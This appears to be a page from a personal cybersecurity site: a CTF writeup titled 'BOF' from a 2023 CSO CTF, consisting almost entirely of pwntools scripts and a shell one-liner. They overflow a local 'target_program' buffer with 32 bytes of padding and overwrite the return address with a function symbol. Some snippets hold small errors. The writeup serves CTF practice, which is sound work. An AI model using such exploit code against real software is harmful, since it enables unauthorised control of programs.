@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BOF · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="other/2023-cso-ctf/bof.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/2023-cso-ctf.html">2023-CSO-CTF</a></div>
+  <h1 id="bof">BOF</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-python">import struct
+import pwn
+e = ELF('./target_program')
+padd = &quot;AAAAABBBBCCCCDDDDEEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWYYYYXXXXZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyyzzzz1111222233334444555566667777888899990000deadbeefsnowtreerockhailrainfourfive&quot;
+addr = 0xdeadbeef #REPLACE WITH ADDRESS, converted in SHELLCODE FUNCTION
+sym_addr = e.symbols['addr']
+shellcode = ''.join('\x{:02x}'.format(b) for b in struct.pack('&lt;I', sym_addr)) #upper i
+print(shellcode)
+</code></pre>
+<pre><code class="language-python">from pwn import *
+e = ELF('/target_program')
+payload  = cyclic(32)
+payload += p32(e.symbols['misc'])
+print(hex(e.symbols['misc']))
+p = process('target_program')
+p.sendline(payload)
+p.interactive()
+'''
+f=open('exploit', 'wb')
+f.write(payload)
+f.close()
+'''
+</code></pre>
+<pre><code class="language-bash">python3 test.py $(python - c 'print &quot;A&quot;*32 + &quot;\xef\xbe\xad\xde&quot;')
+</code></pre>
+<pre><code class="language-python">from pwn import *
+e = ELF('./target_program')
+payload  = cyclic(32) + p32(e.symbols['misc'])
+print(f&quot;Payload: {payload}&quot;)
+p = process(['target_program', payload])
+print(p.recv().decode())
+p.close()
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
